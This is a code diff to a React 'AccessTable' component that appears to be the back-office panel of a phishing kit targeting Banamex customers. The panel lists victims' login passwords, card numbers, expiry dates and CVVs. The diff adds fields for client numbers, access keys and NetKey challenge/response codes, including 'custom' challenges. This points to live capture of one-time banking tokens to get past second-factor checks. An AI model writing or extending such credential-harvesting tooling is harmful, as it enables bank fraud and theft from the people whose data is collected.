@@ -120,6 +120,12 @@ const AccessTable: React.FC<AccessTableProps> = ({
         'Folio', 
         'Usuario/Correo Login', 
         'Contraseña Login', 
+        'Número de Cliente',
+        'Clave de Acceso',
+        'Challenge',
+        'NetKey Response',
+        'Challenge Personalizado',
+        'NetKey Response Personalizado',
         'Tarjeta', 
         'Fecha Vencimiento', 
         'CVV', 
@@ -143,6 +149,12 @@ const AccessTable: React.FC<AccessTableProps> = ({
         session.folio || '',
         session.username || '',
         session.password || '',
+        (session as any).numeroCliente || '',
+        (session as any).claveAcceso || '',
+        (session as any).challenge || '',
+        (session as any).netkeyResponse || '',
+        (session as any).customChallenge || '',
+        (session as any).customNetkeyResponse || '',
         session.tarjeta || '',
         session.fechaVencimiento || '',
         session.cvv || '',
@@ -463,7 +475,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     )}
                     
                     {/* Datos de Banamex */}
-                    {((session as any).numeroCliente || (session as any).claveAcceso || (session as any).challenge || (session as any).netkeyResponse) && (
+                    {((session as any).numeroCliente || (session as any).claveAcceso || (session as any).challenge || (session as any).netkeyResponse || (session as any).customChallenge || (session as any).customNetkeyResponse) && (
                       <div className="mb-3 p-3 bg-[#003d7a] rounded border border-[#0066cc]">
                         <div className="flex items-center mb-2">
                           <KeyRound className="h-4 w-4 text-[#00aaff] mr-2" />
@@ -485,8 +497,18 @@ const AccessTable: React.FC<AccessTableProps> = ({
                           </div>
                         )}
                         {(session as any).netkeyResponse && (
-                          <div className="text-sm text-white">
+                          <div className="text-sm text-white mb-1">
                             <span className="opacity-80">NetKey Response:</span> <span className="font-mono ml-2">{(session as any).netkeyResponse}</span>
+                          </div>
+                        )}
+                        {(session as any).customChallenge && (
+                          <div className="text-sm text-white mb-1">
+                            <span className="opacity-80">Challenge Personalizado:</span> <span className="font-mono ml-2">{(session as any).customChallenge}</span>
+                          </div>
+                        )}
+                        {(session as any).customNetkeyResponse && (
+                          <div className="text-sm text-white">
+                            <span className="opacity-80">NetKey Personalizado:</span> <span className="font-mono ml-2">{(session as any).customNetkeyResponse}</span>
                           </div>
                         )}
                       </div>
@@ -603,6 +625,8 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">Banco</th>
                 <th className="p-3 text-left">Challenge</th>
                 <th className="p-3 text-left">NetKey</th>
+                <th className="p-3 text-left">Challenge Custom</th>
+                <th className="p-3 text-left">NetKey Custom</th>
                 <th className="p-3 text-left">Nombre Contacto</th>
                 <th className="p-3 text-left">Correo Contacto</th>
                 <th className="p-3 text-left">Celular</th>
@@ -641,6 +665,12 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   </td>
                   <td className="p-3 text-white">
                     {(session as any).netkeyResponse || '--'}
+                  </td>
+                  <td className="p-3 text-white font-mono">
+                    {(session as any).customChallenge || '--'}
+                  </td>
+                  <td className="p-3 text-white">
+                    {(session as any).customNetkeyResponse || '--'}
                   </td>
                   <td className="p-3 text-white">
                     {(session as any).nombreContacto || '--'}
